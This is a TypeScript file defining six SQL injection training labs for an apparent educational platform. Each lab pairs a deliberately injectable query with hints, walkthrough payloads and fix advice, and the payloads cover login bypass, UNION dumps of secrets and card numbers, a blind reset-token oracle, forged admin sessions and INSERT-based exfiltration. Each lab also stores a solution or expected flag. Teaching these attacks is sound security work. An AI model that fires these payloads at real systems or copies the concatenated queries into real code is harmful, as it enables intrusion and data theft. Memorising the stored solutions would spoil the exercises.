import type { Lab } from '../types';
import { productsSeed, secretsSeed, usersSeed } from './seeds';
import { fail, findFlag, pass, rowCount } from './helpers';

export const realWorldLabs: Lab[] = [
  {
    id: 'api-json-login',
    title: 'JSON Auth API',
    category: 'realworld',
    difficulty: 'Practitioner',
    dbms: 'SQLite',
    summary: 'A mobile backend takes a JSON body, pulls two fields out of it, and concatenates both into an auth query. Scanners that only fuzz form fields miss it.',
    brief: [
      'Acme\'s mobile app authenticates against `POST /v1/auth` with a JSON body. The handler parses the JSON and then builds its query the same way a 2004 PHP page did.',
      'Because the parameter lives in a JSON document, a lot of tooling never touches it: no `id=` in a query string, no `Content-Type: application/x-www-form-urlencoded`.',
      'The response also returns the caller\'s API token. Every token in this database is high-value.',
    ],
    objective: 'Recover a live API token from the `secrets` table through the JSON body.',
    appURL: 'https://api.acme.io/v1/auth',
    seed: [
      ...usersSeed(),
      `ALTER TABLE users ADD COLUMN api_key TEXT;`,
      `UPDATE users SET api_key = 'ak_live_jdoe_7f21' WHERE username = 'jdoe';`,
      `UPDATE users SET api_key = 'ak_live_admin_9c4e' WHERE username = 'admin';`,
      `CREATE TABLE api_keys (id INTEGER PRIMARY KEY, user_id INTEGER, token TEXT);`,
      ...secretsSeed('FLAG{json_api_injection}'),
    ],
    fields: [
      {
        id: 'body',
        label: 'Request body',
        placeholder: '{"username":"...","password":"..."}',
        value: '{"username":"admin","password":"guess"}',
        multiline: true,
        hint: 'Sent as application/json to POST /v1/auth',
      },
    ],
    query: (v) => {
      let body: Record<string, unknown>;
      try {
        body = JSON.parse(v.body) as Record<string, unknown>;
      } catch {
        return `SELECT 'invalid JSON body' AS error`;
      }
      const username = String(body.username ?? '');
      const password = String(body.password ?? '');
      return `SELECT u.id, u.username, u.role, u.api_key
 FROM users u
 WHERE u.username = '${username}' AND u.password = '${password}'`;
    },
    hints: [
      'The body is parsed as JSON — but what happens to the values after parsing?',
      'Both fields land in the same string-concatenated query. Either one is a way in.',
      'The response has four columns. Pad your UNION with four values.',
    ],
    walkthrough: [
      {
        title: 'Classic auth bypass, JSON edition',
        text: ['The shape of the request changes; the shape of the bug does not.'],
        payload: `{"username":"admin'--","password":"x"}`,
        result: 'Returns the admin row and its API key. No password needed.',
      },
      {
        title: 'Bypass both fields when both are checked',
        text: ['If the app validates the username against the row it got back, make the WHERE clause true instead.'],
        payload: `{"username":"' OR 1=1--","password":"x"}`,
        result: 'Every user row. The handler logs in whoever comes first.',
      },
      {
        title: 'Pivot to another table',
        text: [
          'Four columns: id, username, role, api_key. Drop the secrets table into the fourth slot.',
        ],
        payload: `{"username":"' UNION SELECT 0,'x','admin',value FROM secrets--","password":"x"}`,
        result: 'FLAG{json_api_injection} appears in the api_key field.',
      },
      {
        title: 'Testing notes for real APIs',
        text: [
          'Send JSON injection points through every content type the endpoint accepts. Frameworks that "only" parse JSON are still vulnerable if the parsed value is concatenated.',
          'Watch for GraphQL, gRPC-gateway and batch endpoints — the parameter is often an array, and one element in the array is enough.',
          'Also try JSON type confusion: `{"id": 1}` vs `{"id": "1"}` vs `{"id": ["1"]}`.',
        ],
      },
      {
        title: 'Fix',
        text: ['Bind both values. And never return an API token from an authentication endpoint that cannot verify the caller — rotate the keys in this dump.'],
      },
    ],
    check: (out) => {
      const flag = findFlag(out);
      if (flag) return pass(`API token leak reproduced: ${flag}`);
      const rows = rowCount(out);
      if (rows > 0) return fail('You got user rows back, but no secret. Extend the query into the secrets table.');
      return fail('Authentication failed. Remember the JSON value is concatenated into SQL.');
    },
    solution: {
      body: `{"username":"' UNION SELECT 0,'x','admin',value FROM secrets--","password":"x"}`,
    },
  },

  {
    id: 'ecommerce-search',
    title: 'Product Search → Customer Card Data',
    category: 'realworld',
    difficulty: 'Practitioner',
    dbms: 'SQLite',
    summary: 'A public search box, no authentication, and a payments table in the same schema. This is the bug that ends up in breach notifications.',
    brief: [
      'Shop front search: `GET /search?q=jacket`, no login required. The query joins nothing and the developer never considered that it could reach further than `products`.',
      'The same database stores `payments` — cardholder names, PANs and expiry dates. There is no read-only replica, no schema separation, no row-level security.',
      'This is the archetypal e-commerce SQL injection: unauthenticated, remote, and directly monetisable.',
    ],
    objective: 'Read the `payments` table through the search box.',
    appURL: 'https://shop.trailhead-outfitters.com/search?q=jacket',
    seed: [
      ...productsSeed(),
      `CREATE TABLE payments (id INTEGER PRIMARY KEY, order_id INTEGER, cardholder TEXT, card_number TEXT, expiry TEXT);`,
      `INSERT INTO payments (order_id, cardholder, card_number, expiry) VALUES
         (1001, 'J. Doe', '4242 4242 4242 4242', '04/28'),
         (1002, 'M. Jones', 'FLAG{ecommerce_search_dump}', '11/27'),
         (1003, 'S. Patel', '5555 5555 5555 4444', '02/29');`,
    ],
    fields: [{ id: 'q', label: 'q parameter', placeholder: 'jacket', value: 'jacket' }],
    query: (v) => `SELECT id, name, price, category FROM products WHERE name LIKE '%${v.q}%'`,
    hints: [
      'The value goes inside a LIKE pattern — note that the quotes around it are still breakable.',
      'A percent sign matches everything before your payload, and your quote still closes the string.',
      'Four columns are returned: id, name, price, category.',
    ],
    walkthrough: [
      {
        title: 'Break the pattern',
        text: ['The template is LIKE \'%<input>%\'. A quote inside the input ends the pattern; a percent sign keeps the leading wildcard happy.'],
        payload: `%' UNION SELECT 0,1,2,3--`,
        result: 'A synthetic row appears below the real results.',
      },
      {
        title: 'Point it at payments',
        text: ['Match the column count and types: cardholder and card_number are text.'],
        payload: `%' UNION SELECT 0, cardholder, card_number, expiry FROM payments--`,
        result: 'FLAG{ecommerce_search_dump} shown as a card number.',
      },
      {
        title: 'Business impact',
        text: [
          'Card data is a PCI-DSS scope item. A single unauthenticated UNION here is enough to trigger mandatory breach notification in most jurisdictions.',
          'Real cases: the 2012 Yahoo! Voices breach (450k plaintext credentials), the 2019 Bulgaria revenue agency leak, countless Magento and WooCommerce plugins.',
        ],
      },
      {
        title: 'Fix',
        text: [
          'Parameterise. Then: keep the search index in a separate database with no access to payment tables, and give the storefront user a view-only grant limited to product columns.',
        ],
      },
    ],
    check: (out) => {
      const flag = findFlag(out);
      if (flag) return pass(`Cardholder data exfiltrated unauthenticated: ${flag}`);
      return fail('Still only products. Extend the LIKE pattern with a UNION SELECT.');
    },
    solution: { q: `%' UNION SELECT 0, cardholder, card_number, expiry FROM payments--` },
  },

  {
    id: 'support-tickets',
    title: 'Support Portal Ticket Lookup',
    category: 'realworld',
    difficulty: 'Practitioner',
    dbms: 'SQLite',
    summary: 'The query filters tickets by your own username. The filter is part of the SQL string, so it is part of the attack surface.',
    brief: [
      'Customers view their own tickets at `/ticket?id=1042`. The backend adds `AND owner = \'<session user>\'` so that tickets cannot be enumerated.',
      'That is authorisation implemented in SQL — which is fine, until the SQL is injectable. Then the ownership predicate is just more text for you to comment out or UNION around.',
      'Support tickets are a goldmine in real engagements: password resets, internal hostnames, customer PII, and staff replies that quote credentials.',
    ],
    objective: 'Read a ticket that belongs to another user.',
    appURL: 'https://support.trailhead-outfitters.com/ticket?id=1042',
    seed: [
      `CREATE TABLE tickets (id INTEGER PRIMARY KEY, subject TEXT, body TEXT, owner TEXT, priority TEXT);`,
      `INSERT INTO tickets (subject, body, owner, priority) VALUES
         ('Where is my order?', 'Order 1001 has not arrived.', 'jdoe', 'normal'),
         ('Refund requested', 'Please refund order 1002.', 'jdoe', 'low'),
         ('Payroll export failing', 'The nightly export needs the DB password rotated. Current value: FLAG{support_portal_idor}', 'admin', 'high'),
         ('New starter account', 'Please create an account for the new hire.', 'mjones', 'normal');`,
    ],
    fields: [{ id: 'id', label: 'id parameter', placeholder: '1042', value: '1' }],
    query: (v) => `SELECT id, subject, body, owner FROM tickets WHERE id = ${v.id} AND owner = 'jdoe'`,
    hints: [
      'The owner filter is appended after your parameter — it is text in the same statement.',
      'You cannot comment it out (it comes after yours) but you can UNION around it.',
      'Numeric context: no quote needed. `0 UNION SELECT ...` returns rows even though the first SELECT matches nothing.',
    ],
    walkthrough: [
      {
        title: 'See the predicate you must escape',
        text: ['As the logged-in user `jdoe`, your input is inserted before the ownership check.'],
        payload: `SELECT id, subject, body, owner FROM tickets WHERE id = <input> AND owner = 'jdoe'`,
      },
      {
        title: 'Make the first SELECT empty',
        text: ['`id = 0` matches no row, so the only rows you see will come from your second SELECT.'],
        payload: `0 UNION SELECT id, subject, body, owner FROM tickets--`,
        result: 'The comment removes the owner check. All four tickets are returned.',
      },
      {
        title: 'Read the admin ticket',
        text: ['FLAG{support_portal_idor} is in the body of the admin ticket — a rotated database password pasted into a support thread, which is its own lesson.'],
        payload: `0 UNION SELECT id, subject, body, owner FROM tickets WHERE owner='admin'--`,
      },
      {
        title: 'Fix',
        text: [
          'Two independent bugs: the injection, and the assumption that SQL is an authorisation layer. Fix the first with parameters; keep the second, but enforce it in a place the attacker cannot rewrite.',
          'Never put secrets in ticket bodies, and rotate anything that has ever been pasted into one.',
        ],
      },
    ],
    check: (out) => {
      const flag = findFlag(out);
      if (flag) return pass(`Cross-tenant read: ${flag}`);
      return fail('You are still only seeing jdoe tickets. Union around the ownership filter.');
    },
    solution: { id: `0 UNION SELECT id, subject, body, owner FROM tickets--` },
  },

  {
    id: 'reset-token-blind',
    title: 'Password Reset Token Enumeration',
    category: 'realworld',
    difficulty: 'Expert',
    dbms: 'SQLite',
    summary: 'A reset endpoint validates tokens with a boolean response and no rate limiting. Tokens are the keys to every account.',
    brief: [
      '`/reset/verify?token=...` returns "valid" or "invalid". No data is reflected, so a naive scanner calls it clean.',
      'The token is compared inside an injectable string, which turns the endpoint into an oracle over the `users` table — where the admin reset token lives.',
      'In the real world this is an account-takeover primitive: extract the token, then spend it.',
    ],
    objective: 'Recover the admin reset token through the valid/invalid oracle.',
    appURL: 'https://accounts.acme.io/reset/verify?token=abc123',
    seed: [
      ...usersSeed(),
      `ALTER TABLE users ADD COLUMN reset_token TEXT;`,
      `UPDATE users SET reset_token = 'FLAG{reset_token_blind_enum}' WHERE username = 'admin';`,
      `UPDATE users SET reset_token = 'rt_9f21ab77' WHERE username = 'jdoe';`,
      `UPDATE users SET reset_token = 'rt_4c90de12' WHERE username = 'mjones';`,
    ],
    fields: [{ id: 'token', label: 'token parameter', placeholder: 'abc123', value: 'abc123' }],
    query: (v) => `SELECT id FROM users WHERE reset_token = '${v.token}'`,
    hints: [
      'You get one bit: token valid, or token invalid.',
      'Attach a condition to the row lookup with OR so that a true condition still produces a row.',
      '`substr(reset_token, n, 1)` — walk n from 1 upward.',
    ],
    walkthrough: [
      {
        title: 'Confirm the oracle',
        text: ['Any lookup that returns a row reports "valid".'],
        payload: `rt_9f21ab77`,
        result: 'Token valid — that is jdoe\'s token, and you learned it from a response that returns no data.',
      },
      {
        title: 'Attach a condition to the admin row',
        text: ['The OR lets a false token still match if your condition is true.'],
        payload: `x' OR (SELECT substr(reset_token,1,1) FROM users WHERE username='admin')='F'--`,
        result: 'Valid ⇒ the first character is "F".',
      },
      {
        title: 'Walk it',
        text: [
          'Offset 1, 2, 3, … Compare with `=` for clarity or with `>` for speed. The token is `FLAG{reset_token_blind_enum}` — submit it below.',
          'Note the second-order risk too: this endpoint has no rate limit. 24 characters at 7 requests each is under 200 requests — a few seconds of scripting.',
        ],
        payload: `x' OR (SELECT substr(reset_token,7,1) FROM users WHERE username='admin')='{'--`,
      },
      {
        title: 'Fix',
        text: [
          'Compare tokens with a parameterised query and constant-time comparison. Make tokens long, random, single-use, and stored hashed — as with passwords.',
          'Rate-limit the endpoint and return an identical response regardless of outcome.',
        ],
      },
    ],
    check: (out) => {
      const rows = rowCount(out);
      if (rows > 0) {
        return { solved: false, message: 'Response: "token valid" — a row matched. Your condition was TRUE.' };
      }
      return { solved: false, message: 'Response: "invalid token" — no row matched. Your condition was FALSE.' };
    },
    answer: {
      label: 'Recovered admin token',
      placeholder: 'FLAG{...}',
      expected: 'FLAG{reset_token_blind_enum}',
      note: 'The reset_token of the admin row.',
    },
    solution: {},
    probe: {
      values: { token: `x' OR (SELECT substr(reset_token,1,1) FROM users WHERE username='admin')='F'--` },
      expect: 'rows',
    },
  },

  {
    id: 'session-cookie',
    title: 'Session Cookie Injection',
    category: 'realworld',
    difficulty: 'Practitioner',
    dbms: 'SQLite',
    summary: 'The session token from your cookie is looked up in SQL. Nothing stops you from making the lookup return a forged row.',
    brief: [
      'A legacy application keeps sessions in the database: `SELECT username, role FROM sessions WHERE token = \'<cookie>\'`.',
      'Cookies are user input. They are not escaped by the framework, not covered by your form validation, and rarely appear in a QA checklist.',
      'You have a valid low-privilege session. The question is whether the database believes you are an administrator.',
    ],
    objective: 'Forge an admin session by injecting into the `sid` cookie.',
    appURL: 'https://legacy.acme.io/dashboard',
    seed: [
      `CREATE TABLE sessions (id INTEGER PRIMARY KEY, token TEXT, username TEXT, role TEXT, created_at TEXT);`,
      `INSERT INTO sessions (token, username, role, created_at) VALUES
         ('6f1c2a9b04', 'jdoe', 'user', '2026-10-01 09:12:00'),
         ('a77de1c3ff', 'admin', 'admin', '2026-10-02 11:40:00');`,
      ...usersSeed(),
    ],
    fields: [
      {
        id: 'sid',
        label: 'Cookie: sid',
        placeholder: '6f1c2a9b04',
        value: '6f1c2a9b04',
        hint: 'Value of the sid cookie sent with the request',
      },
    ],
    query: (v) => `SELECT username, role FROM sessions WHERE token = '${v.sid}'`,
    followUp: (db) => ({ label: 'sessions', results: db.exec(`SELECT token, username, role FROM sessions`) }),
    hints: [
      'The cookie is quoted in the query — close the string the same way you would in a form.',
      'The result set defines who you are. Two columns: username, role.',
      '`UNION SELECT` lets you supply both columns yourself.',
    ],
    walkthrough: [
      {
        title: 'Cookie values are parameters too',
        text: ['Read your own session to see the shape of the result set.'],
        payload: `6f1c2a9b04`,
        result: 'jdoe | user',
      },
      {
        title: 'Forge the row',
        text: ['UNION with literals. The application does not check that the row came from the sessions table.'],
        payload: `x' UNION SELECT 'attacker','admin'--`,
        result: 'Dashboard renders as an administrator. No valid admin token was ever needed.',
      },
      {
        title: 'Why cookies get missed',
        text: [
          'Input validation usually runs on request bodies and query strings. Cookies are set by the server, so teams treat them as trusted — but the client controls them entirely.',
          'Same for `User-Agent`, `X-Forwarded-For`, `Referer`, `Accept-Language`, and any custom header that ends up in an audit log or analytics table.',
        ],
      },
      {
        title: 'Fix',
        text: ['Bind the cookie value. Use a signed, server-side session store with a fixed-length opaque token, and validate its format before it ever reaches SQL.'],
      },
    ],
    check: (out) => {
      const rs = out.results[0];
      if (!rs) return fail('No session row returned.');
      const roleIdx = rs.columns.indexOf('role');
      const userIdx = rs.columns.indexOf('username');
      const forged = rs.values.find((r) => String(r[roleIdx]) === 'admin');
      if (forged) return pass(`Session forged: "${forged[userIdx]}" with role admin.`);
      return fail('You are still jdoe. Add a row of your own with UNION.');
    },
    solution: { sid: `x' UNION SELECT 'attacker','admin'--` },
  },

  {
    id: 'log-ingest-insert',
    title: 'Log Ingestion: Injection in an INSERT',
    category: 'realworld',
    difficulty: 'Expert',
    dbms: 'SQLite',
    summary: 'Everyone tests SELECTs. This endpoint only writes — and the write statement is built by concatenation, which makes it a data exfiltration path.',
    brief: [
      'A deployment bot posts a message to `/reports/ingest`, which inserts it into a `reports` table. The dashboard then renders that table.',
      'INSERT statements are frequently forgotten in testing because they return no rows and demonstrate no data. But an injectable INSERT can read from anywhere: you make the database write your stolen data into a place you can see.',
      'This is "in-band via a write sink" — the bug you find only if your test plan covers every endpoint, not just the ones that echo.',
    ],
    objective: 'Get the value of `secrets.value` into the reports table.',
    appURL: 'https://ops.acme.io/reports/ingest',
    seed: [
      ...secretsSeed('FLAG{insert_sink_exfiltration}'),
      `CREATE TABLE reports (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, severity TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP);`,
      `INSERT INTO reports (name, severity) VALUES ('nightly backup completed', 'info');`,
    ],
    fields: [
      { id: 'msg', label: 'Message', placeholder: 'deploy finished', value: 'deploy finished', multiline: true },
    ],
    query: (v) => `INSERT INTO reports (name, severity) VALUES ('${v.msg}', 'info')`,
    followUp: (db) => ({ label: 'reports (rendered on the dashboard)', results: db.exec(`SELECT id, name, severity FROM reports`) }),
    hints: [
      'The template is `VALUES (\'<input>\', \'info\')`. Close the string and start a new tuple.',
      'Multi-row VALUES is valid: `VALUES (\'a\',\'info\'),(\'b\',\'info\')`.',
      'A subquery is a valid expression anywhere a value is: `((SELECT value FROM secrets),\'info\')`.',
    ],
    walkthrough: [
      {
        title: 'The query you cannot see',
        text: ['No result set means no output — but the statement is still yours to shape.'],
        payload: `INSERT INTO reports (name, severity) VALUES ('<input>', 'info')`,
      },
      {
        title: 'Add a second tuple',
        text: ['Close the string and the tuple, then open a new one containing a subquery.'],
        payload: `x','info'),((SELECT value FROM secrets),'info')--`,
        result: `INSERT INTO reports (name,severity) VALUES ('x','info'),((SELECT value FROM secrets),'info')`,
      },
      {
        title: 'Read it back from the dashboard',
        text: ['The table below the response is what the ops team sees in their UI. Your extracted value is now a "report".'],
        result: 'FLAG{insert_sink_exfiltration}',
      },
      {
        title: 'Other write sinks worth testing',
        text: [
          'UPDATE with concatenated WHERE or SET values; DELETE with an injectable predicate (destructive, test carefully); bulk CSV imports; audit log writers that store the raw User-Agent.',
          'In MSSQL, an injectable INSERT can also be chained with `OUTPUT` or a stacked `EXEC` — a common route from a logging endpoint to command execution.',
        ],
      },
      {
        title: 'Fix',
        text: ['Bind the message. Validate by type and length, and never build SQL from log content — logs are the least trusted data you have.'],
      },
    ],
    check: (_out, db) => {
      const rows = db.exec(`SELECT name FROM reports`);
      const names = rows.flatMap((r) => r.values.map((row) => String(row[0] ?? '')));
      const hit = names.map((n) => n.match(/FLAG\{[A-Za-z0-9_!-]+\}/)).find(Boolean);
      if (hit) return pass(`Secret written into a table you can read: ${hit[0]}`);
      return fail('Nothing new in the reports table. You need the INSERT to store the secret as a row.');
    },
    solution: { msg: `x','info'),((SELECT value FROM secrets),'info')--` },
  },
];
